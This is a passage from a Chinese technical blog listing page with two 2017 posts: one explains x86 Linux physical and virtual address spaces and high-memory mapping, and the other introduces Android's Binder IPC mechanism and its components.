  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-x86-Linux中的地址空间" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/05/18/x86-Linux%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/" class="article-date">
  <time datetime="2017-05-18T12:30:04.000Z" itemprop="datePublished">2017-05-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/05/18/x86-Linux%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/">x86 Linux中的地址空间</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近在看Linux Kernel Exploit相关的东西，要用到一些栈和地址相关的知识，所以就看一点补充一点吧。这篇文章介绍一下关于物理地址和虚拟地址的相关知识。</p>
<h2 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h2><p>计算机系统的主存被组织成一个由M个连续的字节大小的单元组成的数组。每字节都有一个唯一的<code>物理地址（Physical Address，PA）</code>。CPU访问存储器的最自然的方式就是使用物理地址。这种方式称为<code>物理寻址（physical addressing）</code>。<br>早期的PC使用物理寻址，现代处理器使用的是一种称为<code>虚拟寻址（virtual addressing）</code>的寻址方式。CPU通过生成一个<code>虚拟地址（Virtual Address，VA）</code>来访问主存，这个虚拟地址在被送到存储器之前转换成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做<code>地址翻译（address translation）</code>。CPU上叫做<code>存储器管理单元（Memory Management Unit，MMU）</code>的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容是由操作系统管理的。  </p>
<h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><p><code>地址空间（address space）</code>是一个非负整数地址的有序集合：{0, 1, 2, …}<br>如果地址空间中的整数是连续的，那么就说它是一个<code>线性地址空间（linear address space）</code>。在一个带虚拟存储器的系统中，CPU从一个有N=$2^n$个地址的地址空间中生成虚拟地址，这个地址空间称为<code>虚拟地址空间（virtual address space）</code>：{0, 1, 2, …, N-1}<br>一个地址空间的大小是由<code>n</code>来描述，叫做一个<code>n</code>位地址空间。现代系统典型支持32位或64位虚拟地址空间。<br>一个系统还有一个<code>物理地址空间（physical address space）</code>，它与系统中物理存储器的M个字节相对应：{0, 1, 2, …, M-1}<br>地址空间清楚地区分了数据对象（字节）和它们的属性（地址）。每个数据对象有多个独立的地址，其中每个地址都选自一个不同的地址空间。这就是虚拟存储器的基本思想。主存中的每个字节都有一个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</p>
<h2 id="物理地址空间布局"><a href="#物理地址空间布局" class="headerlink" title="物理地址空间布局"></a>物理地址空间布局</h2><p><img src="/images/addrspace/physicaladdr.jpg"><br>如上图所示，在物理地址空间中，内存划分如下：</p>
<table>
<thead>
<tr>
<th align="left">内存区域</th>
<th align="left">地址空间</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ZONE_DMA</td>
<td align="left">0~16M</td>
<td align="left">该区域的物理页面专门供I/O设备的DMA使用</td>
</tr>
<tr>
<td align="left">ZONE_NORMAL</td>
<td align="left">16M~896M</td>
<td align="left">该区域的物理页面是内核能够直接使用的</td>
</tr>
<tr>
<td align="left">ZONE_HIGHMEM</td>
<td align="left">896M~4G</td>
<td align="left">该区域即为高端内存，内核不能直接使用</td>
</tr>
</tbody></table>
<h2 id="虚拟地址空间布局"><a href="#虚拟地址空间布局" class="headerlink" title="虚拟地址空间布局"></a>虚拟地址空间布局</h2><p><img src="/images/addrspace/kernel.jpg"><br>如上图，32位Linux中虚拟地址空间划分<code>0~3G</code>为用户空间，<code>3~4G</code>为内核空间（64位的划分是不同的）。其中内核空间中，在kernel image下面有16M的内核空间用于DMA操作。位于内核空间高端的128M地址主要由3部分组成，分别为vmalloc area，持久化内核映射区，临时内核映射区。<br>当内核模块代码或线程访问内存时，代码中的内存地址都为虚拟地址，需要映射为物理地址。</p>
<h2 id="虚拟地址与物理地址映射关系"><a href="#虚拟地址与物理地址映射关系" class="headerlink" title="虚拟地址与物理地址映射关系"></a>虚拟地址与物理地址映射关系</h2><p><img src="/images/addrspace/map.jpg"><br>如图所示，虚拟地址空间中的<code>3G ~ 3G+896M</code>（0xC0000000 ~ 0xF8000000）和物理地址空间的<code>0 ~ 896M</code>（0 ~ 0x38000000）一一映射。当内核想访问高于896MB物理地址内存时，从虚拟地址空间<code>3G+896M ~ 4G</code>（0xF8000000 ~ 0xFFFFFFFF）范围内找一段相应大小空闲的地址空间，借用这段地址空间，建立映射到想访问的那段物理内存（即填充内核PTE页面表），临时用一会，用完后归还。这样别人也可以借用这段地址空间访问其他物理地址空间，实现了使用有限的地址空间，访问所有所有物理地址空间。<br>例如，内核想访问2G开始的一段大小为1MB的物理内存，即物理地址范围为0×80000000 ~ 0x800FFFFF。访问之前先找到一段1MB大小的空闲虚拟地址空间，假设找到的空闲地址空间为0xF8700000 ~ 0xF87FFFFF，用这1MB的虚拟地址空间映射到物理地址空间0×80000000 ~ 0x800FFFFF的内存。</p>
<h2 id="用户空间布局"><a href="#用户空间布局" class="headerlink" title="用户空间布局"></a>用户空间布局</h2><p><img src="/images/addrspace/user.jpg"><br>用户进程没有高端内存概念。只有在内核空间才存在高端内存。用户进程最多只可以访问3G物理内存，而内核进程可以访问所有物理内存。<br><strong>reference</strong><br>深入理解计算机系统<br><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-15007890-id-3415331.html">http://blog.chinaunix.net/uid-15007890-id-3415331.html</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/chengxuyuancc/archive/2013/04/17/3026920.html">http://www.cnblogs.com/chengxuyuancc/archive/2013/04/17/3026920.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/18/x86-Linux%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/" data-id="ckhe7o4n70059chl70krj2n5w" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Android跨进程通信——Binder实现机制" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/05/13/Android%E8%B7%A8%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94Binder%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6/" class="article-date">
  <time datetime="2017-05-13T01:52:31.000Z" itemprop="datePublished">2017-05-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/05/13/Android%E8%B7%A8%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94Binder%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6/">Android跨进程通信——Binder实现机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Android中的IPC为何要采用Binder机制"><a href="#Android中的IPC为何要采用Binder机制" class="headerlink" title="Android中的IPC为何要采用Binder机制"></a>Android中的IPC为何要采用Binder机制</h3><p>Binder是Android系统提供的一种进程间通信（IPC）机制。由于Android是基于Linux内核的，因此，还存在其他的IPC机制，Linux已经拥有的进程间通信IPC手段包括：<code>管道（Pipe）</code>、<code>信号（Signal）和跟踪（Trace）</code>、<code>Socket</code>、<code>报文队列（Message）</code>、<code>共享内存（Shared Memory）</code>和<code>信号量（Semaphore）</code>。采用Binder机制主要有两点，性能和安全。在移动设备上，广泛地使用跨进程通信肯定对通信机制本身提出了严格的要求；Binder相对出传统的Socket方式，更加高效；另外，传统的进程通信方式对于通信双方的身份并没有做出严格的验证，只有在上层协议上进行架设；比如Socket通信ip地址是客户端手动填入的，都可以进行伪造；而Binder机制从协议本身就支持对通信双方做身份校检，因而大大提升了安全性。这个也是Android权限模型的基础。<br>Binder相对于其他IPC机制更加灵活方便。Android系统基本上可以看做是一个基于Binder通信的C/S架构。Binder就像网络一样，把系统各个部分连接在一起。</p>
<h3 id="Android中Binder实现原理"><a href="#Android中Binder实现原理" class="headerlink" title="Android中Binder实现原理"></a>Android中Binder实现原理</h3><p>Android中的Binder通信都是通过虚拟设备<code>/dev/binder</code>来实现的，Binder的驱动代码在kernel/driver/android/binder.c中，代码还算简单。我们知道一些硬件都会对应一个驱动程序，而Binder驱动程序没有对应的硬件，所以叫做虚拟设备驱动程序，其实<code>/dev/binder</code>就是一个字符设备，或者叫混杂设备（miscdevice）。<br>Binder机制由一些系统组件组成：<code>Client</code>、<code>Server</code>、<code>Service Manager</code>和<code>Binder驱动程序</code>，其中<code>Client</code>、<code>Server</code>和<code>Service Manager</code>运行在用户空间，<code>Binder驱动程序</code>运行在内核空间。其中的核心组件便是Binder驱动程序，<code>Service Manager</code>提供了辅助管理的功能，<code>Client</code>和<code>Server</code>正是在<code>Binder驱动</code>和<code>Service Manager</code>提供的基础设施上实现通信。组件之间的关系如下图：<br><img src="/images/binder/platform.png"><br>Binder驱动程序提供设备文件<code>/dev/binder</code>与用户空间交互，<code>Client</code>、<code>Server</code>和<code>Service Manager</code>通过文件操作函数<code>open()</code>和<code>ioctl()</code>与Binder驱动程序进行通信。<br><code>Service Manager</code>是整个Binder机制的保护进程，用来管理开发者创建的各种<code>Server</code>（Server进程注册一个或多个Service到Service Manager中），并向<code>Client</code>提供查询<code>Server</code>远程接口的功能。<code>Service Manager</code>的源代码位于frameworks/native/cmds/servicemanager目录中，主要由binder.h、binder.c和servicemanager.c组成。<br>Binder是Android中非常重要的机制，详细内容远不止如此，这里只是简单介绍，更多内容可以看这两篇文章：<br><a target="_blank" rel="noopener" href="http://blog.csdn.net/universus/article/details/6211589">Android Bander设计与实现 - 设计篇</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/luoshengyang/article/details/6618363"> Android进程间通信（IPC）机制Binder</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/13/Android%E8%B7%A8%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94Binder%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6/" data-id="ckhe7o4k7000gchl72eu17loz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
          </li>
        
          <li>
            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/06/User-namespace/">User namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>